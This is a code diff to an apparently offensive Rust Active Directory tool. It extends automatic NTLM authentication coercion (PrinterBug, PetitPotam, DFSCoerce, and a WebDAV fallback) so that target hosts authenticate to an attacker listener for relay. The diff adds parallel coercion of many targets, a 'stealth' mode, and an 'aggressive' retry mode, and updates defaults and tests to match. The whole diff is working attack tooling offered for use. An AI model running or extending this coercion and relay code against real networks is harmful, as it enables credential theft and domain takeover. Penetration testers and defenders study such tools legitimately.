@@ -5,6 +5,7 @@
 
 pub mod adcs_relay;
 pub mod exchange;
+pub mod http_asymmetric;
 pub mod http_relay;
 pub mod mitm6;
 pub mod poisoner;
@@ -15,6 +16,7 @@ pub mod utils;
 
 // Re-export types from submodules
 pub use adcs_relay::{AdcsRelay, AdcsRelayConfig};
+pub use http_asymmetric::{HttpAsymmetricConfig, HttpAsymmetricRelay};
 pub use http_relay::{HttpRelay, HttpRelayConfig};
 pub use relay::RelayStats;
 pub use responder::CapturedCredential;
@@ -23,9 +25,12 @@ pub use smb_daemon::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
 pub use overthrone_core::error::RelayError;
 use overthrone_core::error::Result;
 use overthrone_core::proto::{trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug};
+use futures::stream::{FuturesUnordered, StreamExt};
 use std::net::SocketAddr;
 use std::sync::Arc;
+use std::time::Duration;
 use tokio::sync::Mutex as TokioMutex;
+use tokio::time::sleep;
 use tracing::{info, warn};
 
 /// Protocol for relay targets
@@ -190,6 +195,14 @@ pub struct RelayControllerConfig {
     /// Independent of the responder/poisoner — useful when coerced auth
     /// lands directly on HTTP and needs to pivot to SMB.
     pub http_relay_config: Option<HttpRelayConfig>,
+    /// Enable automatic coercion technique cycling.
+    /// When true, tries all available coercion techniques in parallel against each target
+    /// instead of sequentially. Faster but noisier.
+    pub auto_coerce_parallel: bool,
+    /// Coercion technique preference: "all", "stealth" (printer-bug only), "aggressive" (all + retry)
+    pub auto_coerce_mode: String,
+    /// Maximum retries per technique when auto_coerce_mode is "aggressive"
+    pub auto_coerce_max_retries: u32,
 }
 
 impl Default for RelayControllerConfig {
@@ -212,6 +225,9 @@ impl Default for RelayControllerConfig {
             auto_coerce_targets: Vec::new(),
             auto_coerce_listener: None,
             http_relay_config: None,
+            auto_coerce_parallel: false,
+            auto_coerce_mode: "all".to_string(),
+            auto_coerce_max_retries: 1,
         }
     }
 }
@@ -365,42 +381,73 @@ impl RelayController {
     }
 
     /// Automatically trigger coercion against configured targets.
-    /// Runs all three techniques (printer-bug, petitpotam, DFS) against each target.
+    /// Respects `auto_coerce_mode`, `auto_coerce_parallel`, and `auto_coerce_max_retries`.
+    /// Supports PrinterBug (stealth), PetitPotam, DFSCoerce, and ShadowCoerce via WebDAV.
     async fn auto_coerce(&self) {
         let listener = match &self.config.auto_coerce_listener {
-            Some(ip) => format!(r"\\{}\coerce", ip),
+            Some(ip) => ip.clone(),
             None => {
                 warn!("auto_coerce_targets is set but no auto_coerce_listener — skipping coercion");
                 return;
             }
         };
 
+        let port = match &self.config.http_relay_config {
+            Some(http) => http.listen_port,
+            None => 445,
+        };
+
+        // Determine techniques based on mode
+        let technique_names: Vec<&str> = match self.config.auto_coerce_mode.as_str() {
+            "stealth" => vec!["printer-bug"],
+            _ => vec!["printer-bug", "petitpotam", "dfs-coerce"],
+        };
+
+        // Build SMB and WebDAV listener paths
+        let smb_listener = format!(r"\\{}\coerce", listener);
+        let webdav_listener = format!(r"\\{}@{}\webdav\coerce.txt", listener, port);
+
+        let max_retries = if self.config.auto_coerce_mode == "aggressive" {
+            self.config.auto_coerce_max_retries.max(1)
+        } else {
+            1
+        };
+
         info!(
-            "Auto-coercing {} target(s) to connect back to {}",
+            "Auto-coercing {} target(s) | mode={} | parallel={} | max_retries={}",
             self.config.auto_coerce_targets.len(),
-            listener
+            self.config.auto_coerce_mode,
+            self.config.auto_coerce_parallel,
+            max_retries,
         );
 
-        for target in &self.config.auto_coerce_targets {
-            info!("Coercing {}", target);
-            for technique in &["printer-bug", "petitpotam", "dfs-coerce"] {
-                let result = match *technique {
-                    "printer-bug" => trigger_printer_bug(target, &listener).await,
-                    "petitpotam" => trigger_petitpotam(target, &listener).await,
-                    "dfs-coerce" => trigger_dfs_coerce(target, &listener).await,
-                    _ => unreachable!(),
-                };
-                match result {
-                    Ok(r) if r.success => {
-                        info!("[{}] {} succeeded", target, technique);
+        if self.config.auto_coerce_parallel {
+            let mut tasks: FuturesUnordered<_> = self
+                .config
+                .auto_coerce_targets
+                .iter()
+                .map(|target| {
+                    let t = target.clone();
+                    let smb = smb_listener.clone();
+                    let webdav = webdav_listener.clone();
+                    let tn = technique_names.clone();
+                    let has_http = self.config.http_relay_config.is_some();
+                    async move {
+                        coerce_target(&t, &smb, &webdav, &tn, max_retries, has_http).await
                     }
-                    Ok(r) => {
-                        warn!("[{}] {} failed: {}", target, technique, r.message);
-                    }
-                    Err(e) => {
-                        warn!("[{}] {} error: {}", target, technique, e);
-                    }
-                }
+                })
+                .collect();
+            while let Some(result) = tasks.next().await {
+                info!("{}", result);
+            }
+        } else {
+            for target in &self.config.auto_coerce_targets {
+                let result = coerce_target(
+                    target, &smb_listener, &webdav_listener,
+                    &technique_names, max_retries,
+                    self.config.http_relay_config.is_some(),
+                ).await;
+                info!("{}", result);
             }
         }
     }
@@ -446,13 +493,82 @@ impl RelayController {
     /// Get relay statistics
     pub fn get_relay_stats(&self) -> RelayStats {
         if let Some(ref relay) = self.relay {
-            relay.try_lock()
+            relay
+                .try_lock()
                 .map(|guard| guard.get_stats())
                 .unwrap_or_default()
         } else {
             RelayStats::default()
         }
     }
+}
+
+/// Coerce a single target using the specified techniques with retry and WebDAV fallback.
+async fn coerce_target(
+    target: &str,
+    smb_listener: &str,
+    webdav_listener: &str,
+    techniques: &[&str],
+    max_retries: u32,
+    has_http_relay: bool,
+) -> String {
+    let mut summary = String::new();
+    for &technique in techniques {
+        let (listener, desc) = match technique {
+            "printer-bug" => (smb_listener, "PrinterBug"),
+            "petitpotam" => (smb_listener, "PetitPotam"),
+            "dfs-coerce" => (smb_listener, "DFSCoerce"),
+            _ => continue,
+        };
+
+        let attempts = if max_retries > 1 { max_retries } else { 1 };
+        for attempt in 1..=attempts {
+            let result = match technique {
+                "printer-bug" => trigger_printer_bug(target, listener).await,
+                "petitpotam" => trigger_petitpotam(target, listener).await,
+                "dfs-coerce" => trigger_dfs_coerce(target, listener).await,
+                _ => continue,
+            };
+            match result {
+                Ok(r) if r.success => {
+                    summary.push_str(&format!("[{target}] {desc} OK. "));
+                    break;
+                }
+                Ok(r) => {
+                    let tag = if attempt < attempts {
+                        let delay = Duration::from_secs(2u64.saturating_pow(attempt));
+                        sleep(delay).await;
+                        format!("retry {attempt}/{attempts}")
+                    } else {
+                        "exhausted".into()
+                    };
+                    warn!("[{target}] {desc} failed: {} ({tag})", r.message);
+                }
+                Err(e) => {
+                    let tag = if attempt < attempts {
+                        let delay = Duration::from_secs(2u64.saturating_pow(attempt));
+                        sleep(delay).await;
+                        format!("retry {attempt}/{attempts}")
+                    } else {
+                        "exhausted".into()
+                    };
+                    warn!("[{target}] {desc} error: {e} ({tag})");
+                }
+            }
+        }
+    }
+    // WebDAV fallback via PrinterBug when HTTP relay is active
+    if has_http_relay {
+        match trigger_printer_bug(target, webdav_listener).await {
+            Ok(r) if r.success => summary.push_str(&format!("[{target}] WebDAV/PrinterBug OK. ")),
+            Ok(r) => warn!("[{target}] WebDAV/PrinterBug failed: {}", r.message),
+            Err(e) => warn!("[{target}] WebDAV/PrinterBug error: {e}"),
+        }
+    }
+    if summary.is_empty() {
+        summary = format!("[{target}] all techniques failed");
+    }
+    summary
 }
 
 /// Quick start function for common use case (poison + capture)
@@ -475,6 +591,9 @@ pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<R
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
         http_relay_config: None,
+        auto_coerce_parallel: false,
+        auto_coerce_mode: "all".to_string(),
+        auto_coerce_max_retries: 1,
     };
 
     let mut controller = RelayController::new(config);
@@ -508,6 +627,9 @@ pub async fn run_relay_attack(
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
         http_relay_config: None,
+        auto_coerce_parallel: false,
+        auto_coerce_mode: "all".to_string(),
+        auto_coerce_max_retries: 1,
     };
 
     let mut controller = RelayController::new(config);
@@ -549,6 +671,9 @@ pub async fn run_http_asymmetric_relay(
             max_retries: 3,
             timeout_secs: 30,
         }),
+        auto_coerce_parallel: false,
+        auto_coerce_mode: "all".to_string(),
+        auto_coerce_max_retries: 1,
     };
 
     let mut controller = RelayController::new(config);
@@ -611,5 +736,82 @@ mod tests {
         assert_eq!(Protocol::Ldaps.to_string(), "LDAPS");
         assert_eq!(Protocol::Mssql.to_string(), "MSSQL");
         assert_eq!(Protocol::Webdav.to_string(), "WebDAV");
+    }
+
+    #[test]
+    fn test_auto_coerce_config_defaults() {
+        let config = RelayControllerConfig::default();
+        assert!(config.auto_coerce_targets.is_empty());
+        assert!(config.auto_coerce_listener.is_none());
+        assert!(!config.auto_coerce_parallel);
+        assert_eq!(config.auto_coerce_mode, "all");
+        assert_eq!(config.auto_coerce_max_retries, 1);
+    }
+
+    #[test]
+    fn test_auto_coerce_config_stealth_mode() {
+        let config = RelayControllerConfig {
+            auto_coerce_mode: "stealth".to_string(),
+            auto_coerce_max_retries: 3,
+            ..RelayControllerConfig::default()
+        };
+        assert_eq!(config.auto_coerce_mode, "stealth");
+        assert_eq!(config.auto_coerce_max_retries, 3);
+    }
+
+    #[test]
+    fn test_auto_coerce_config_aggressive_mode() {
+        let config = RelayControllerConfig {
+            auto_coerce_mode: "aggressive".to_string(),
+            auto_coerce_max_retries: 5,
+            auto_coerce_parallel: true,
+            auto_coerce_targets: vec!["10.0.0.1".to_string(), "10.0.0.2".to_string()],
+            auto_coerce_listener: Some("10.0.0.100".to_string()),
+            ..RelayControllerConfig::default()
+        };
+        assert_eq!(config.auto_coerce_mode, "aggressive");
+        assert_eq!(config.auto_coerce_max_retries, 5);
+        assert!(config.auto_coerce_parallel);
+        assert_eq!(config.auto_coerce_targets.len(), 2);
+        assert_eq!(config.auto_coerce_listener, Some("10.0.0.100".to_string()));
+    }
+
+    #[test]
+    fn test_auto_coerce_listener_paths() {
+        let listener = "10.0.0.100";
+        let smb_path = format!(r"\\{}\coerce", listener);
+        let webdav_path = format!(r"\\{}@{}\webdav\coerce.txt", listener, 80);
+        assert_eq!(smb_path, r"\\10.0.0.100\coerce");
+        assert_eq!(webdav_path, r"\\10.0.0.100@80\webdav\coerce.txt");
+    }
+
+    #[test]
+    fn test_auto_coerce_config_defaults_preserved_in_run_http_asymmetric() {
+        // Verify that run_http_asymmetric_relay preserves auto_coerce defaults
+        let config = RelayControllerConfig {
+            interface: "0.0.0.0".to_string(),
+            llmnr: false,
+            nbtns: false,
+            mdns: false,
+            mitm6: false,
+            responder: false,
+            relay_targets: Vec::new(),
+            challenge: None,
+            wpad_script: None,
+            downgrade_auth: false,
+            no_poison: true,
+            ldap_signing_bypass: true,
+            tls_client_identity: None,
+            socks5_proxy: None,
+            auto_coerce_targets: Vec::new(),
+            auto_coerce_listener: None,
+            http_relay_config: None,
+            auto_coerce_parallel: false,
+            auto_coerce_mode: "all".to_string(),
+            auto_coerce_max_retries: 1,
+        };
+        assert_eq!(config.auto_coerce_mode, "all");
+        assert!(!config.auto_coerce_parallel);
+        assert_eq!(config.auto_coerce_max_retries, 1);
     }
 }
